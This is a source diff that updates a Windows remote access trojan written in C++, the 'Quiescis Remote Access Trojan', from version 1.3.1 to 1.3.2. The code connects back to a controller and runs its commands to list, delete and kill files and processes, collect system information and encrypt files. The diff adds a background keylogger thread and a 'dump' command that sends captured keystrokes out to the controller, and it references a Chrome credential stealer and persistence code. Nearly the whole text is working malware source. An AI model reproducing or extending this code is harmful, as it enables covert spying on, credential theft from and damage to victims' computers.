@@ -1,5 +1,5 @@
 /*
- * Quiescis Remote Access Trojan 1.3.1
+ * Quiescis Remote Access Trojan 1.3.2
  * WARNING!
  * This software is the full property of the author
  * Not intended for dumb kids
@@ -12,6 +12,7 @@
 #include <winsock2.h>
 #include <fstream>
 #include <string>
+#include <thread>
 
 #include "Config.h"
 
@@ -29,6 +30,8 @@
 #endif // chrome_stealer
 
 std::string buf, rbuf, key_ret, keydel, rkeydel, buf_file, loc_buf_file, keylog_path, chars, finally_msg, n_path;
+std::string key_log_dump;
+bool close = false;
 
 int Shell(SOCKADDR_IN addr);
 
@@ -44,25 +47,25 @@ int main() {
 	HINSTANCE hKernel;
 
 	hKernel = LoadLibrary((LPCWSTR)"KERNEL32.DLL");
-	if (hKernel) {
-		RegisterServiceProcess = (int(__stdcall*)(DWORD, DWORD))
-			GetProcAddress(hKernel, "RegisterServiceProcess");
-	}
+	if (hKernel)
+		RegisterServiceProcess = (int(__stdcall*)(DWORD, DWORD)) GetProcAddress(hKernel, "RegisterServiceProcess");
 
 #endif // end autorun
 	// server configuration start
 	SOCKADDR_IN add = Server();
+	// activate thread with passive keylogger
+	std::thread th(passive_keylogger, std::ref(key_log_dump), std::ref(close));
 	// start kurva
 	Shell(add);
+	th.join();
 	return 0;
 }
 
 int Shell(SOCKADDR_IN addr) {
 	char path[2048];
 	SOCKET conn = socket(AF_INET, SOCK_STREAM, NULL);
-	if (connect(conn, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
-		return 1;
-	}
+	if (connect(conn, (SOCKADDR*)&addr, sizeof(addr)) != 0) return 1;
+
 	char buffer[256];
 	while (true) {
 		// deliting the temp file for commands
@@ -76,11 +79,11 @@ int Shell(SOCKADDR_IN addr) {
 		buf_file = "";
 		loc_buf_file = "";
 		memset(&buffer, 0x0, sizeof(buffer));
-
-		recv(conn, buffer, sizeof(buffer), NULL);
 		memset(&path, 0x0, sizeof(path));
 
-		if (strcmp(buffer, "ls") == 0) {
+		recv(conn, buffer, sizeof(buffer), NULL);
+
+		if (!strcmp(buffer, "ls")) {
 			recv(conn, path, sizeof(path), NULL);
 			std::string comm = "dir " + std::string(path) + " > file.txt";
 			system(comm.c_str());
@@ -95,7 +98,7 @@ int Shell(SOCKADDR_IN addr) {
 			send(conn, buf_file.c_str(), buf_file.length(), NULL);
 		}
 
-		else if (strcmp(buffer, "rm") == 0) {
+		else if (!strcmp(buffer, "rm")) {
 			recv(conn, path, sizeof(path), NULL);
 
 			n_path = path;
@@ -112,7 +115,7 @@ int Shell(SOCKADDR_IN addr) {
 			send(conn, finally_msg.c_str(), finally_msg.length(), NULL);
 		}
 
-		else if (strcmp(buffer, "rmdir") == 0) {
+		else if (!strcmp(buffer, "rmdir")) {
 			recv(conn, path, sizeof(path), NULL);
 
 			n_path = path;
@@ -129,7 +132,7 @@ int Shell(SOCKADDR_IN addr) {
 			send(conn, finally_msg.c_str(), finally_msg.length(), NULL);
 		}
 
-		else if (strcmp(buffer, "pwd") == 0) {
+		else if (!strcmp(buffer, "pwd")) {
 			system("echo %cd% > file.txt");
 			std::ifstream F;
 			F.open("file.txt", std::ios::in);
@@ -142,12 +145,12 @@ int Shell(SOCKADDR_IN addr) {
 			F.close();
 		}
 
-		else if (strcmp(buffer, "info") == 0) {
+		else if (!strcmp(buffer, "info")) {
 			std::string info = GetAllInfo();
 			send(conn, info.c_str(), info.length(), NULL);
 		}
 
-		else if (strcmp(buffer, "ps") == 0) {
+		else if (!strcmp(buffer, "ps")) {
 			system("tasklist > file.txt");
 			std::ifstream F;
 			F.open("file.txt", std::ios::in);
@@ -159,7 +162,7 @@ int Shell(SOCKADDR_IN addr) {
 			F.close();
 		}
 
-		else if (strcmp(buffer, "kill") == 0) {
+		else if (!strcmp(buffer, "kill")) {
 			recv(conn, path, sizeof(path), NULL);
 			std::string com = "taskkill /T /F /IM " + std::string(path);
 			system(com.c_str());
@@ -175,25 +178,6 @@ int Shell(SOCKADDR_IN addr) {
 		else if (!strcmp(buffer, "error")) {
 			recv(conn, path, sizeof(path), NULL);
 			MessageBoxA(NULL, path, "error 0x648396234", MB_ICONERROR | MB_OK | MB_SETFOREGROUND);
-		}
-
-		else if (!strcmp(buffer, "keylogger")) {
-			keylog_path = getenv("LOCALAPPDATA") + std::string("\\");
-			recv(conn, path, sizeof(path), NULL);
-			while (buf.length() < unsigned int(atoi(path) + 7) && rbuf.length() < unsigned int(atoi(path) + 7)) {
-				keylogger(keylog_path);
-				buf = readFile(keylog_path + "keylog.txt");
-				rbuf = readFile(keylog_path + "keylogru.txt");
-			}
-			key_ret = "\nen:\n" + buf + "\n\nru:\n" + rbuf;
-			keydel = "del " + keylog_path + "keylog.txt";
-			rkeydel = "del " + keylog_path + "keylogru.txt";
-			system(keydel.c_str());
-			system(rkeydel.c_str());
-			send(conn, key_ret.c_str(), key_ret.length(), NULL);
-
-			memset(&buf, 0x0, sizeof(buf));
-			memset(&rbuf, 0x0, sizeof(rbuf));
 		}
 
 		else if (!strcmp(buffer, "cryptfile")) {
@@ -241,7 +225,15 @@ int Shell(SOCKADDR_IN addr) {
 #endif
 		}
 
-		else if (strcmp(buffer, "close") == 0) return 1;
+		else if (!strcmp(buffer, "dump")) {
+			send(conn, key_log_dump.c_str(), key_log_dump.length(), NULL);
+			key_log_dump = "";
+		}
+
+		else if (!strcmp(buffer, "close")) {
+			close = true;
+			return 0;
+		}
 	}
 	return 0;
 }
